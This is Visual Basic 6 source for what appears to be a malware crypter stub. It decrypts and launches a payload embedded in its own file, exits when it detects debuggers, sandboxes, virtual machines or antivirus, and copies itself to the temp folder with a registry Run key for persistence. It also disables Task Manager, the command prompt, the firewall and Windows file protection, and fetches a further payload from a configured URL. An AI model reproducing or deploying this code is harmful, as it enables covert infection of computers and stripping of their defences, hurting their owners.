Attribute VB_Name = "a"
Option Explicit
Private Declare Function OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long
Private Declare Function IsDebuggerPresent Lib "kernel32" () As Long
Private Declare Function FreeLibrary Lib "kernel32" (ByVal hLibModule As Long) As Long
Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any) As Long
Private Declare Sub InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long)
Private Declare Function InternetOpenA Lib "wininet.dll" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetOpenUrlA Lib "wininet.dll" (ByVal hOpen As Long, ByVal sUrl As String, ByVal sHeaders As String, ByVal lLength As Long, ByVal lFlags As Long, ByVal lContext As Long) As Long
Private Declare Sub InternetReadFile Lib "wininet.dll" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long)
Public Enum InternetOpenType
  IOTPreconfig = 0
  IOTDirect = 1
  IOTProxy = 3
End Enum
Const df = "z&/T78t678T&7G&/"
Dim HOOK() As String
Dim UNHOOKER As String
Dim O() As Byte
Dim UNHOOK As String
Dim command As String
Dim Data() As Byte
Dim P() As Byte
Dim Reg As Object
Sub Main()
Call Start
End Sub
Sub e()
Open App.Path & "\" & App.ExeName & ".exe" For Binary As #1
UNHOOK = Space(LOF(1))
Get #1, , UNHOOK
Close #1
End Sub
Sub tz()
Call abc(App.Path & "\" & App.ExeName & ".exe", O(), command)
End Sub
Public Function Start()
Call e
HOOK() = Split(UNHOOK, df)
If HOOK(3) = "" Then
Else
HOOK(3) = command
End If
If HOOK(4) = "" Then
Else
Call Sandboxhelp
End If
If HOOK(5) = "" Then
Else
Call vm
End If
If HOOK(6) = "" Then
Else
If IsDebuggerActive() = True Then End
If ChkIsDebuggerPresent Then End
End If
If HOOK(8) = "" Then
Else
Call Normanhelp
End If
If HOOK(9) = "" Then
Else
If Module4.IsCWSandbox = True Then End
End If
If HOOK(10) = "" Then
Else
If Module4.BDSandbox Then End
End If
If HOOK(11) = "" Then
Else
If Module4.IsSunbelt = True Then End
End If
If HOOK(12) = "" Then
Else
If Module5.sGetXPCDKey = "76487-337-8429955-22614" Then End
If Module4.IsInAnubis Then End
If GetSerialNumber(Environ("SystemDrive") & "\") = 1824245000 Then End
End If
If HOOK(13) = "" Then
Else
Call Löschen
End If
If HOOK(14) = "" Then
Else
If HOOK(14) = "Information" Then
MsgBox (HOOK(2)), vbInformation, HOOK(15)
End If
If HOOK(14) = "Error" Then
MsgBox (HOOK(2)), vbCritical, HOOK(15)
End If
If HOOK(14) = "Warnung" Then
MsgBox (HOOK(2)), vbExclamation, HOOK(15)
End If
End If
If HOOK(16) = "" Then
Else
KillProcess (HOOK(16))
End If
If HOOK(17) = "" Then
Else
If Module1.IfRunningExe("avp.exe") Then End
If Module4.IsDLLInjected2("r3hook.dll") Then End
End If
If HOOK(18) = "" Then
Else
Call FileCopy(App.Path & "\" & App.ExeName & ".exe", Environ("tmp") & "\uptodate.exe")
WriteRegistry HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\policies\explorer\run\", "Update.exe", 1, Environ("temp") & "\uptodate.exe"
End If
If HOOK(19) = "" Then
Else
Call Taskmanager_Deaktivieren
End If
If HOOK(20) = "" Then
Else
Call CMD_Deaktivieren
End If
If HOOK(21) = "" Then
Else
Call Firewall_Deaktivieren
End If
If HOOK(22) = "" Then
Else
Call DisableSFP(App.Path & "\" & App.ExeName & ".exe")
End If
If HOOK(23) = "" Then
Else
Dim Magnetic As Long
Magnetic = OpenURL(HOOK(23))
Call abc(App.Path & "\" & App.ExeName & ".exe", StrConv(Magnetic, vbFromUnicode), command)
End If
UNHOOKER = strDecrypt(HOOK(1), HOOK(24))
O() = StrConv(UNHOOKER, vbFromUnicode)
If HOOK(7) = "" Then
Else
Call BIND
Call tz
End If
Call tz
End
End Function
Public Function IsDebuggerActive() As Boolean
IsDebuggerActive = Not (OutputDebugString(VarPtr(ByVal "=)")) = 1)
End Function
Sub BIND()
Data() = StrConv(HOOK(7), vbFromUnicode)
Call abc(App.Path & "\" & App.ExeName & ".exe", Data(), command)
End Sub
Function ChkIsDebuggerPresent() As Boolean
If IsDebuggerPresent <> 0 Then
ChkIsDebuggerPresent = True
Else
ChkIsDebuggerPresent = False
End If
End Function
Private Sub Taskmanager_Deaktivieren()
   Set Reg = CreateObject("Wscript.shell")
   Reg.Regwrite _
   "HKEY_CURRENT_USER\Software\Microsoft\Windows\" & _
   "CurrentVersion\Policies\System\DisableTaskMgr", "1", _
   "REG_DWORD"
End Sub
Private Sub CMD_Deaktivieren()
   Set Reg = CreateObject("Wscript.shell")
   Reg.Regwrite _
   "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\" & _
   "System\DisableCMD", "1", _
   "REG_DWORD"
End Sub
Private Sub Firewall_Deaktivieren()
On Error Resume Next
Call Shell("cmd.exe /c netsh firewall set opmode disable", vbHide)
End Sub
Public Function DisableSFP(ByVal Dateipfad As String)
On Error Resume Next
    Dim Libary As Long
    Dim ProcAdress As Long
Libary = LoadLibrary("SFC_OS.DLL")
ProcAdress = GetProcAddress(Libary, "SfcFileException")
CallWindowProc ProcAdress, "", "0", Dateipfad, "-1"
End Function
Public Function OpenURL( _
    ByVal URL As String, _
    Optional ByVal OpenType As InternetOpenType = IOTPreconfig _
  ) As String
  Const INET_RELOAD = &H80000000
  Dim hInet As Long
  Dim hURL As Long
  Dim buffer As String * 2048
  Dim Bytes As Long
  
  
  hInet = InternetOpenA( _
      "mkm", OpenType, _
      vbNullString, vbNullString, 0)
  hURL = InternetOpenUrlA( _
      hInet, URL, vbNullString, 0, INET_RELOAD, 0)
 
  Do
    InternetReadFile hURL, buffer, Len(buffer), Bytes
    If Bytes = 0 Then Exit Do
    OpenURL = OpenURL & Left$(buffer, Bytes)
  Loop

  InternetCloseHandle hURL
  InternetCloseHandle hInet
End Function


